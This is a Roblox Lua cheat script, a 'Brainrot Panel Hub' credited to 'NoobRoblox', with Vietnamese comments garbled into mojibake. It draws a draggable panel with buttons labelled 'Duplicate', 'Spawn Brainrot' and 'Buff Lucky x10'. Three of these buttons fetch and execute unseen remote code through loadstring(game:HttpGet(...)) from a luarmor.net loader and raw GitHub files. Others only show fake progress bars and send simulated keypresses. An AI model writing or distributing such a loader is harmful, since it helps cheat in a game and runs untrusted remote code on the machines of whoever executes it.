local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

-- X√≥a GUI c≈©
if PlayerGui:FindFirstChild("BrainrotHub") then
	PlayerGui.BrainrotHub:Destroy()
end

-- GUI ch√≠nh
local gui = Instance.new("ScreenGui", PlayerGui)
gui.Name = "BrainrotHub"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- N√∫t toggle
local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size = UDim2.new(0, 50, 0, 50)
toggleBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(128, 0, 255)
toggleBtn.Text = "‚ö°"
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextSize = 22
toggleBtn.Active = true
toggleBtn.Draggable = true
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1, 0)

-- Hi·ªáu ·ª©ng hover
toggleBtn.MouseEnter:Connect(function()
	TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(90, 30, 180)}):Play()
end)
toggleBtn.MouseLeave:Connect(function()
	TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(128, 0, 255)}):Play()
end)

-- K√©o t·ª± do
local dragging, dragStart, startPos
toggleBtn.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = toggleBtn.Position
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		TweenService:Create(toggleBtn, TweenInfo.new(0.1), {
			Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		}):Play()
	end
end)
UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)

-- Frame ch√≠nh
local mainFrame = Instance.new("Frame", gui)
mainFrame.Size = UDim2.new(0, 420, 0, 360)
mainFrame.Position = UDim2.new(0.5, -210, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 15)

-- Hi·ªáu ·ª©ng ·∫©n/hi·ªán
local function showPanel()
	mainFrame.Visible = true
	mainFrame.BackgroundTransparency = 1
	mainFrame.Size = UDim2.new(0, 10, 0, 10)
	TweenService:Create(mainFrame, TweenInfo.new(0.45, Enum.EasingStyle.Back), {
		Size = UDim2.new(0, 420, 0, 360),
		BackgroundTransparency = 0
	}):Play()
end
local function hidePanel()
	TweenService:Create(mainFrame, TweenInfo.new(0.4), {
		Size = UDim2.new(0, 10, 0, 10),
		BackgroundTransparency = 1
	}):Play()
	task.wait(0.4)
	mainFrame.Visible = false
end

local opened = false
toggleBtn.MouseButton1Click:Connect(function()
	if opened then hidePanel() else showPanel() end
	opened = not opened
end)

-- Ti√™u ƒë·ªÅ
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.Text = "üß† Brainrot Panel Hub"
title.TextColor3 = Color3.fromRGB(200, 200, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Left

-- Close
local closeBtn = Instance.new("TextButton", mainFrame)
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 8)
closeBtn.Text = "‚ùå"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
closeBtn.BackgroundTransparency = 1
closeBtn.TextColor3 = Color3.fromRGB(180, 100, 100)
closeBtn.MouseButton1Click:Connect(hidePanel)

-- Divider
local divider = Instance.new("Frame", mainFrame)
divider.Size = UDim2.new(1, -20, 0, 1)
divider.Position = UDim2.new(0, 10, 0, 42)
divider.BackgroundColor3 = Color3.fromRGB(90, 60, 180)

-- Khung n√∫t
local buttonsFrame = Instance.new("ScrollingFrame", mainFrame)
buttonsFrame.Size = UDim2.new(1, 0, 1, -60)
buttonsFrame.Position = UDim2.new(0, 0, 0, 50)
buttonsFrame.BackgroundTransparency = 1
buttonsFrame.ScrollBarThickness = 4
buttonsFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y

local listLayout = Instance.new("UIListLayout", buttonsFrame)
listLayout.Padding = UDim.new(0, 10)
listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Key mapping cho c√°c h√†nh ƒë·ªông
local virtualKeys = {
	["Execute All Event"] = Enum.KeyCode.E,
	["3 Roads"] = Enum.KeyCode.R,
	["Buff Lucky x10"] = Enum.KeyCode.L
}

-- H√†m g·ª≠i ph√≠m ·∫£o
local function pressKey(key)
	VirtualInputManager:SendKeyEvent(true, key, false, game)
	task.wait(0.25)
	VirtualInputManager:SendKeyEvent(false, key, false, game)
end

-- H√†m t·∫°o n√∫t
local function createButton(name, color)
	local btn = Instance.new("TextButton", buttonsFrame)
	btn.Size = UDim2.new(0, 350, 0, 40)
	btn.Text = name
	btn.Font = Enum.Font.GothamMedium
	btn.TextSize = 18
	btn.BackgroundColor3 = color
	btn.TextColor3 = Color3.new(1,1,1)
	btn.AutoButtonColor = false
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0,10)

	if virtualKeys[name] then
		local keyLabel = Instance.new("TextLabel", btn)
		keyLabel.Size = UDim2.new(0, 70, 1, 0)
		keyLabel.Position = UDim2.new(1, -80, 0, 0)
		keyLabel.BackgroundTransparency = 1
		keyLabel.Text = "["..virtualKeys[name].Name.."]"
		keyLabel.TextColor3 = Color3.fromRGB(230,230,230)
		keyLabel.Font = Enum.Font.Gotham
		keyLabel.TextSize = 14
		keyLabel.TextXAlignment = Enum.TextXAlignment.Right
	end

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {
			BackgroundColor3 = color:Lerp(Color3.new(1,1,1),0.25)
		}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {
			BackgroundColor3 = color
		}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		btn.Text = "Processing..."
		local progress = 0
		while progress < 100 do
			progress += math.random(5,10)
			if progress > 100 then progress = 100 end
			btn.Text = name .. " - " .. progress .. "%"
			task.wait(math.random(0.07, 0.15))
		end
		btn.Text = "‚úÖ Done!"
		task.wait(0.6)
		btn.Text = name

		-- G·ª≠i ph√≠m ·∫£o (n·∫øu c√≥)
		if virtualKeys[name] then
			pressKey(virtualKeys[name])
		end

		-- Ch·∫°y script ri√™ng cho t·ª´ng n√∫t ƒë·∫∑c bi·ªát
		if name == "Brainrot Dealer" then
			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/13c33d62bc915316ab79080b1a7b78a7.lua"))()
		elseif name == "Duplicate" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"))()
		elseif name == "Spawn Brainrot" then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoobRoblox/Test/refs/heads/main/Brainrot%20Spawner"))()
		end
	end)
end

-- C√°c n√∫t
createButton("Brainrot Dealer", Color3.fromRGB(80, 60, 200))
createButton("Duplicate", Color3.fromRGB(60, 140, 200))
createButton("Spawn Brainrot", Color3.fromRGB(130, 90, 240))
createButton("Execute All Event", Color3.fromRGB(200, 90, 90))
createButton("3 Roads", Color3.fromRGB(100, 190, 120))
createButton("Buff Lucky x10", Color3.fromRGB(230, 180, 60))

-- Footer
local footer = Instance.new("TextLabel", mainFrame)
footer.Size = UDim2.new(1, 0, 0, 25)
footer.Position = UDim2.new(0, 0, 1, -25)
footer.BackgroundTransparency = 1
footer.Text = "Made by NoobRoblox | v3.0"
footer.Font = Enum.Font.Gotham
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(120, 120, 180)
footer.TextXAlignment = Enum.TextXAlignment.Center
